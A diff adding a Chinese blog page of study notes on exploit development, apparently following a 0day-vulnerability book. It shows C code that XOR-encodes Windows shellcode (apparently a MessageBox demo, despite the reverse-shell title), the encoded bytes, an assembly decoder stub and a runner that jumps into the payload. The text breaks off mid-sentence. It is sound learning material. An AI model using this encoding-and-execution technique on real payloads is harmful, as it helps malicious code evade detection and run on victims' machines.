@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="SeikoSrp">
+
+
+
+
+
+
+<title>0day漏洞挖掘_3.5_构造一个反弹shell的shellcode | a blog</title>
+
+
+
+    <link rel="icon" href="/haidao.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        // console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<!-- Chic/layout.ejs -->
+ <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">SeikoSrp&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                <!-- 这里表示的是pc端搜索框 -->
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">SeikoSrp&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">前往底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部折叠"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">0day漏洞挖掘_3.5_构造一个反弹shell的shellcode</h1>
+            
+                <div class="post-meta">
+                    
+                        作者: <a itemprop="author" rel="author" href="/">SeikoSrp</a>
+                    
+
+                    
+                        <span class="post-time">
+                        发布于: <a href="#">六月 3, 2021&nbsp;&nbsp;10:45:32</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="加密shellcode"><a href="#加密shellcode" class="headerlink" title="加密shellcode"></a>加密shellcode</h1><p>书中的这里使用的异或加密，即先加密，然后再解密，完整代码为：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 03_xor_shellcode.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = &#123; <span class="number">0xFC</span>, <span class="number">0x68</span>, <span class="number">0x6A</span>, <span class="number">0x0A</span>, <span class="number">0x38</span>, <span class="number">0x1E</span>, <span class="number">0x68</span>, <span class="number">0x63</span>, <span class="number">0x89</span>, <span class="number">0xD1</span>, <span class="number">0x4F</span>, <span class="number">0x68</span>, <span class="number">0x32</span>, <span class="number">0x74</span>, <span class="number">0x91</span>, <span class="number">0x0C</span>, <span class="number">0x89</span>, <span class="number">0xE6</span>, <span class="number">0x8D</span>, <span class="number">0x7E</span>, <span class="number">0xF4</span>, <span class="number">0x31</span>, <span class="number">0xDB</span>, <span class="number">0xB7</span>, <span class="number">0x04</span>, <span class="number">0x29</span>, <span class="number">0xDC</span>, <span class="number">0x66</span>, <span class="number">0xBB</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x53</span>, <span class="number">0x68</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x54</span>, <span class="number">0x31</span>, <span class="number">0xD2</span>, <span class="number">0x64</span>, <span class="number">0x8B</span>, <span class="number">0x5A</span>, <span class="number">0x30</span>, <span class="number">0x8B</span>, <span class="number">0x4B</span>, <span class="number">0x0C</span>, <span class="number">0x8B</span>, <span class="number">0x49</span>, <span class="number">0x1C</span>, <span class="number">0x8B</span>, <span class="number">0x09</span>, <span class="number">0x8B</span>, <span class="number">0x69</span>, <span class="number">0x08</span>, <span class="number">0xAD</span>, <span class="number">0x3D</span>, <span class="number">0x6A</span>, <span class="number">0x0A</span>, <span class="number">0x38</span>, <span class="number">0x1E</span>, <span class="number">0x75</span>, <span class="number">0x05</span>, <span class="number">0x95</span>, <span class="number">0xFF</span>, <span class="number">0x57</span>, <span class="number">0xF8</span>, <span class="number">0x95</span>, <span class="number">0x60</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x3C</span>, <span class="number">0x8B</span>, <span class="number">0x4C</span>, <span class="number">0x05</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0xE9</span>, <span class="number">0x8B</span>, <span class="number">0x59</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0xEB</span>, <span class="number">0x31</span>, <span class="number">0xFF</span>, <span class="number">0x47</span>, <span class="number">0x8B</span>, <span class="number">0x34</span>, <span class="number">0xBB</span>, <span class="number">0x01</span>, <span class="number">0xEE</span>, <span class="number">0x99</span>, <span class="number">0x0F</span>, <span class="number">0xBE</span>, <span class="number">0x06</span>, <span class="number">0x38</span>, <span class="number">0xE0</span>, <span class="number">0x74</span>, <span class="number">0x08</span>, <span class="number">0xC1</span>, <span class="number">0xCA</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0xC2</span>, <span class="number">0x46</span>, <span class="number">0xEB</span>, <span class="number">0xF1</span>, <span class="number">0x3B</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xE4</span>, <span class="number">0x8B</span>, <span class="number">0x59</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0xEB</span>, <span class="number">0x66</span>, <span class="number">0x8B</span>, <span class="number">0x3C</span>, <span class="number">0x7B</span>, <span class="number">0x8B</span>, <span class="number">0x59</span>, <span class="number">0x1C</span>, <span class="number">0x01</span>, <span class="number">0xEB</span>, <span class="number">0x03</span>, <span class="number">0x2C</span>, <span class="number">0xBB</span>, <span class="number">0x95</span>, <span class="number">0x5F</span>, <span class="number">0xAB</span>, <span class="number">0x57</span>, <span class="number">0x61</span>, <span class="number">0x3D</span>, <span class="number">0x6A</span>, <span class="number">0x0A</span>, <span class="number">0x38</span>, <span class="number">0x1E</span>, <span class="number">0x75</span>, <span class="number">0xA9</span>, <span class="number">0x31</span>, <span class="number">0xDB</span>, <span class="number">0x53</span>, <span class="number">0x68</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x66</span>, <span class="number">0x61</span>, <span class="number">0x69</span>, <span class="number">0x6C</span>, <span class="number">0x89</span>, <span class="number">0xE0</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0xFF</span>, <span class="number">0x57</span>, <span class="number">0xFC</span>, <span class="number">0x53</span>, <span class="number">0xFF</span>, <span class="number">0x57</span>, <span class="number">0xF8</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encoder</span><span class="params">(<span class="keyword">char</span>* input ,<span class="keyword">unsigned</span> <span class="keyword">char</span> key,<span class="keyword">int</span> display_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>,len = <span class="number">0</span>;</span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* output;</span><br><span class="line">    len = <span class="built_in">strlen</span>(input);</span><br><span class="line">    output = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(len+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(!output)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"memory erro!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 循环异或</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        output[i]=input[i]^key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(fp=fopen(<span class="string">"encode.txt"</span>,<span class="string">"w+"</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"output file create erro"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(fp,<span class="string">"\""</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(fp,<span class="string">"\\x%0.2x"</span>,output[i]);</span><br><span class="line">        <span class="keyword">if</span>((i+<span class="number">1</span>)%<span class="number">16</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp,<span class="string">"\"\n\""</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(fp,<span class="string">"\";"</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"dump the encoded shellcode to encode.txt OK!\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(display_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%0.2x "</span>,output[i]);</span><br><span class="line">            <span class="keyword">if</span>((i+<span class="number">1</span>)%<span class="number">16</span>==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</span><br><span class="line">	encoder(shellcode,<span class="number">0x44</span>,<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里主要的代码就是异或的那一行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">output[i]&#x3D;input[i]^key;</span><br></pre></td></tr></table></figure>
+
+<p>可以到网上在线异或运算的计算一下结果是否一样：<a href="https://www.23bei.com/tool-531.html" target="_blank" rel="noopener">https://www.23bei.com/tool-531.html</a></p>
+<p>结果为：</p>
+<p><img src="0day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98_3.5_%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E5%8F%8D%E5%BC%B9shell%E7%9A%84shellcode.assets/image-20210603110023620.png" alt="image-20210603110023620"></p>
+<p>shellcode为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48&quot;</span><br><span class="line">&quot;\xcd\xa2\xc9\x3a\xb0\x75\x9f\xf3\x40\x6d\x98\x22\xff\x77\x76\x17&quot;</span><br><span class="line">&quot;\x2c\x31\x37\x21\x36\x10\x75\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf&quot;</span><br><span class="line">&quot;\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1&quot;</span><br><span class="line">&quot;\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x45\xad\xcf\x1d&quot;</span><br><span class="line">&quot;\x64\x45\xaf\x75\xbb\x03\xcf\x70\xff\x45\xaa\xdd\x4b\xfa\x42\x7c&quot;</span><br><span class="line">&quot;\xa4\x30\x4c\x85\x8e\x43\x45\x86\x02\xaf\xb5\x7f\x10\x60\x58\x31&quot;</span><br><span class="line">&quot;\xa0\xcf\x1d\x60\x45\xaf\x22\xcf\x78\x3f\xcf\x1d\x58\x45\xaf\x47&quot;</span><br><span class="line">&quot;\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x75\x9f&quot;</span><br><span class="line">&quot;\x17\x2c\x33\x21\x37\x30\x2c\x22\x25\x2d\x28\xcd\xa4\x17\x14\x14&quot;</span><br><span class="line">&quot;\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4\xd4\xd4\xd4&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>然后可以使用下面的汇编代码进行解码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        add eax,<span class="number">0x14</span></span><br><span class="line">        <span class="keyword">xor</span> ecx,ecx</span><br><span class="line">        decode_loop:</span><br><span class="line">        mov bl,[eax+ecx]</span><br><span class="line">        <span class="keyword">xor</span> bl,<span class="number">0x44</span></span><br><span class="line">        mov [eax+ecx],bl</span><br><span class="line">        inc ecx</span><br><span class="line">        cmp bl,<span class="number">0x90</span></span><br><span class="line">        jne decode_loop</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是这里的汇编代码是不能直接执行的，书里是转化成下面的代码来执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 03_xor_shellcode.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> encode_shellcode[] = </span><br><span class="line"><span class="comment">// 这一串对应的是上面解码的汇编代码</span></span><br><span class="line"><span class="string">"\x83\xc0\x14"</span></span><br><span class="line"><span class="string">"\x33\xC9"</span></span><br><span class="line"><span class="string">"\x8A\x1C\x08"</span></span><br><span class="line"><span class="string">"\x80\xF3\x44"</span></span><br><span class="line"><span class="string">"\x88\x1C\x08"</span></span><br><span class="line"><span class="string">"\x41"</span></span><br><span class="line"><span class="string">"\x80\xFB\x90"</span></span><br><span class="line"><span class="string">"\x75\xF1"</span></span><br><span class="line"><span class="string">"\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48"</span></span><br><span class="line"><span class="string">"\xcd\xa2\xc9\x3a\xb0\x75\x9f\xf3\x40\x6d\x98\x22\xff\x77\x76\x17"</span></span><br><span class="line"><span class="string">"\x2c\x31\x37\x21\x36\x10\x75\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf"</span></span><br><span class="line"><span class="string">"\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1"</span></span><br><span class="line"><span class="string">"\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x45\xad\xcf\x1d"</span></span><br><span class="line"><span class="string">"\x64\x45\xaf\x75\xbb\x03\xcf\x70\xff\x45\xaa\xdd\x4b\xfa\x42\x7c"</span></span><br><span class="line"><span class="string">"\xa4\x30\x4c\x85\x8e\x43\x45\x86\x02\xaf\xb5\x7f\x10\x60\x58\x31"</span></span><br><span class="line"><span class="string">"\xa0\xcf\x1d\x60\x45\xaf\x22\xcf\x78\x3f\xcf\x1d\x58\x45\xaf\x47"</span></span><br><span class="line"><span class="string">"\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x75\x9f"</span></span><br><span class="line"><span class="string">"\x17\x2c\x33\x21\x37\x30\x2c\x22\x25\x2d\x28\xcd\xa4\x17\x14\x14"</span></span><br><span class="line"><span class="string">"\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4\xd4\xd4\xd4"</span>;</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		lea eax, encode_shellcode</span><br><span class="line">		push eax</span><br><span class="line">		ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是这样未免有点太蠢了，所以我们直接使用汇编语言解码，这样就不用修改加密之后的shellcode了：</p>
